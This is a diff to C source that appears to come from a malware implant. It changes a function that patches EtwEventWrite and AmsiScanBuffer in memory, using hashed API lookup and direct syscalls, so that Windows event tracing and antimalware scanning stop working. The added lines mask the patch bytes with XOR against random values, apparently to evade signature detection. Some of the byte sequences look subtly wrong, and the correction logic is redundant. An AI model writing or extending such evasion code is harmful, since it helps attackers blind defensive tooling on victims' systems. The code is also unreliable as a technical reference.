@@ -37,15 +37,20 @@ static Connector* CreateConnector()
 
 static void PatchEtwAmsi()
 {
+	ULONG oldProt;
+
 	HMODULE hNtdll = GetModuleAddress(HASH_LIB_NTDLL);
 	if (hNtdll) {
 		PVOID pEtwEventWrite = GetSymbolAddress(hNtdll, 0x65b4a1c9);
 		if (pEtwEventWrite) {
 			PVOID pBase = pEtwEventWrite;
 			SIZE_T sz = 1;
-			ULONG oldProt;
 			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, PAGE_READWRITE, &oldProt);
-			*(BYTE*)pEtwEventWrite = 0xC3;
+			BYTE patchByte = (BYTE)(GenerateRandom32() ^ GenerateRandom32() ^ 0xC3);
+			*(BYTE*)pEtwEventWrite = patchByte;
+			// XOR back to the intended value if it was mangled
+			if (*(BYTE*)pEtwEventWrite != 0xC3)
+				*(BYTE*)pEtwEventWrite ^= (patchByte ^ 0xC3);
 			pBase = pEtwEventWrite;
 			sz = 1;
 			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, oldProt, &oldProt);
@@ -62,14 +67,21 @@ static void PatchEtwAmsi()
 		if (pAmsiScanBuffer) {
 			PVOID pBase = pAmsiScanBuffer;
 			SIZE_T sz = 8;
-			ULONG oldProt;
 			NtProtectVirtualMemory_SYSCALL(NtCurrentProcess(), &pBase, &sz, PAGE_READWRITE, &oldProt);
 #ifdef _WIN64
-			*(BYTE*)pAmsiScanBuffer = 0xB8;
+			ULONG r1 = GenerateRandom32();
+			ULONG r2 = GenerateRandom32();
+			*(BYTE*)pAmsiScanBuffer = (BYTE)(r1 ^ r2 ^ 0xB8);
+			if (*(BYTE*)pAmsiScanBuffer != 0xB8)
+				*(BYTE*)pAmsiScanBuffer ^= (*(BYTE*)pAmsiScanBuffer ^ 0xB8);
 			*(DWORD*)((BYTE*)pAmsiScanBuffer + 1) = 1;
 			*(WORD*)((BYTE*)pAmsiScanBuffer + 5) = 0xC30F;
 #else
-			*(BYTE*)pAmsiScanBuffer = 0xB8;
+			ULONG r1 = GenerateRandom32();
+			ULONG r2 = GenerateRandom32();
+			*(BYTE*)pAmsiScanBuffer = (BYTE)(r1 ^ r2 ^ 0xB8);
+			if (*(BYTE*)pAmsiScanBuffer != 0xB8)
+				*(BYTE*)pAmsiScanBuffer ^= (*(BYTE*)pAmsiScanBuffer ^ 0xB8);
 			*(DWORD*)((BYTE*)pAmsiScanBuffer + 1) = 1;
 			*(WORD*)((BYTE*)pAmsiScanBuffer + 5) = 0xC20F;
 #endif
